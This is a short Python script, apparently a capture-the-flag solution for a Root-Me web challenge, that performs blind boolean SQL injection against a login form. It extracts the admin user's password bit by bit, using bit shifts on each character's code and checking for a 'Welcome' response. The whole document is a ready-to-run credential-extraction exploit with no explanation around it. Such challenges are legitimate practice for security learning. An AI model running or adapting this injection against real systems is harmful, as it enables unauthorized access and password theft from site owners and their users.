# SQL injection with bit shifting

import requests

url = 'http://challenge01.root-me.org/web-serveur/ch10/'

def bit_shift(pos):
    x = 0
    for i in range(8):
        r = requests.post(url, {
            'username': f"' or 1=(select unicode(substr(password,{pos},1))>>{7 - i}&1 from users WHERE username='admin')-- -",
            'password': 'a'
        })
        x <<= 1
        if 'Welcome' in r.text:
            x |= 1
        print(bin(x))
    return x

key = ''
while True:
    c = bit_shift(len(key) + 1)
    if not c:
        break
    key += chr(c)
    print('Found: ', key)